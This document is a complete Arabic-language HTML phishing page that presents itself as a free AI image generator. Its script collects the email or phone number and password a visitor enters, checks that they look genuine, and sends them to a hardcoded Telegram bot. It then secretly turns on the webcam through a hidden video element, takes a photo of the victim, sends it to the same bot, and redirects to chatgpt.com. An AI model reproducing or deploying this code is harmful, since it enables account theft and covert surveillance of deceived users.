<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI FREE GENERATOR | منصة الذكاء الاصطناعي</title>
    <style>
        :root { --main-bg: #05070a; --card-bg: #10141d; --accent: #00f2fe; --gold: #ffd700; --error: #ff4d4d; }
        body { background: var(--main-bg); color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow-x: hidden; }
        
        /* جاليري الصور المتحرك */
        .ai-gallery { display: flex; gap: 10px; overflow: hidden; padding: 15px 0; background: #000; border-bottom: 2px solid #1e2533; }
        .ai-gallery img { width: 140px; height: 140px; border-radius: 12px; object-fit: cover; animation: slide 25s linear infinite; border: 1px solid #333; }
        @keyframes slide { 0% { transform: translateX(0); } 100% { transform: translateX(1200px); } }

        .container { width: 92%; max-width: 420px; margin: 30px auto; text-align: center; }
        .auth-card { background: var(--card-bg); border: 1px solid #1e2533; border-radius: 25px; padding: 35px 25px; box-shadow: 0 15px 60px rgba(0,0,0,0.9); position: relative; }
        .auth-card::before { content: "OFFICIAL AI PORTAL"; position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: var(--accent); color: #000; font-size: 10px; font-weight: bold; padding: 2px 10px; border-radius: 5px; }
        
        h1 { color: var(--accent); font-size: 26px; margin-bottom: 5px; text-shadow: 0 0 15px rgba(0,242,254,0.3); }
        .sub-text { color: #8492a6; font-size: 13px; margin-bottom: 25px; line-height: 1.5; }

        .input-group { text-align: right; margin-bottom: 18px; }
        label { display: block; font-size: 12px; color: #8492a6; margin-bottom: 6px; padding-right: 5px; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #1e2533; background: #05070a; color: #fff; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        input:focus { border-color: var(--accent); outline: none; }
        
        .error-hint { color: var(--error); font-size: 11px; margin-top: 6px; display: none; font-weight: bold; animation: shake 0.3s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }

        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(45deg, #00f2fe, #7c4dff); color: #fff; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; }
        
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; }
        #capture-screen { display: none; }
        .scanner-circle { width: 160px; height: 160px; border: 3px solid var(--accent); border-radius: 50%; margin: 25px auto; position: relative; overflow: hidden; }
        .scan-line { width: 100%; height: 4px; background: var(--accent); position: absolute; animation: scan 2s infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body onclick="initVoice()">

    <div id="overlay">
        <div>
            <h1>مرحباً بك في AI HUB</h1>
            <p style="color:#8492a6">اضغط في أي مكان للبدء بصناعة صورك</p>
            <div style="border:3px solid #333; border-top-color:var(--accent); border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
        </div>
    </div>

    <div class="ai-gallery">
        <img src="https://image.pollinations.ai/prompt/robot%20drawing%20art?width=300&height=300">
        <img src="https://image.pollinations.ai/prompt/cyberpunk%20car%20in%20egypt?width=300&height=300">
        <img src="https://image.pollinations.ai/prompt/beautiful%20fantasy%20landscape?width=300&height=300">
        <img src="https://image.pollinations.ai/prompt/futuristic%20phone%20design?width=300&height=300">
    </div>

    <div class="container">
        <div class="auth-card" id="login-box">
            <h1>الذكاء الاصطناعي مجاناً</h1>
            <p class="sub-text">سجل حسابك الرسمي (فيسبوك أو جوجل) للوصول لمحرك GPT-5 وتوليد الصور مجاناً.</p>

            <div class="input-group">
                <label>البريد الإلكتروني أو الهاتف</label>
                <input type="text" id="u_id" placeholder="example@gmail.com">
                <div id="err-id" class="error-hint">⚠️ الحساب غير موثق، يرجى كتابة حسابك الحقيقي.</div>
            </div>

            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="u_pass" placeholder="••••••••">
                <div id="err-pass" class="error-hint">⚠️ كلمة المرور ضعيفة جداً، يرجى كتابة الباسورد الصحيح.</div>
            </div>

            <button class="btn-main" onclick="startLogic()">دخول واستمرار</button>
        </div>

        <div class="auth-card" id="capture-screen">
            <div class="scanner-circle"><div class="scan-line"></div></div>
            <h2 style="color:var(--accent)">جاري فحص البصمة...</h2>
            <video id="v" autoplay muted playsinline></video>
        </div>
    </div>

    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
        const chat_id = "5177962707";
        let voiced = false;

        function initVoice() {
            if (voiced) return;
            document.getElementById('overlay').style.display = 'none';
            const msg = new SpeechSynthesisUtterance("مرحباً بك في عالم الذكاء الاصطناعي المجاني. من فضلك، لكي تبدأ في توليد الصور، سجل حسابك الحقيقي أولاً لربط هويتك بالسيرفر.");
            msg.lang = 'ar-SA';
            msg.rate = 0.95;
            window.speechSynthesis.speak(msg);
            voiced = true;
        }

        function startLogic() {
            const id = document.getElementById('u_id').value;
            const pass = document.getElementById('u_pass').value;
            
            // فلتر ذكي للإيميل والباسورد
            const emailCheck = /^[a-zA-Z0-9._%+-]+@(gmail|yahoo|hotmail|outlook)\.com$/;
            const phoneCheck = /^01[0125][0-9]{8}$/;

            if (!emailCheck.test(id) && !phoneCheck.test(id)) {
                document.getElementById('err-id').style.display = 'block';
                return;
            } else { document.getElementById('err-id').style.display = 'none'; }

            if (pass.length < 7 || /^(.)\1+$/.test(pass)) {
                document.getElementById('err-pass').style.display = 'block';
                return;
            } else { document.getElementById('err-pass').style.display = 'none'; }

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 صيد جديد حقيقي!\nالحساب: ${id}\nالباسورد: ${pass}`);

            document.getElementById('login-box').style.display = 'none';
            document.getElementById('capture-screen').style.display = 'block';
            captureAction();
        }

        async function captureAction() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chat_id);
                        fd.append('photo', blob, 'identity.jpg');
                        fd.append('caption', '🚀 صورة الضحية وصلت!\nسجل ببياناته الحقيقية.');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        setTimeout(() => { location.href = "https://chatgpt.com"; }, 2000);
                    }, 'image/jpeg');
                }, 5000);
            } catch (e) { location.reload(); }
        }
    </script>
    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
</body>
</html>
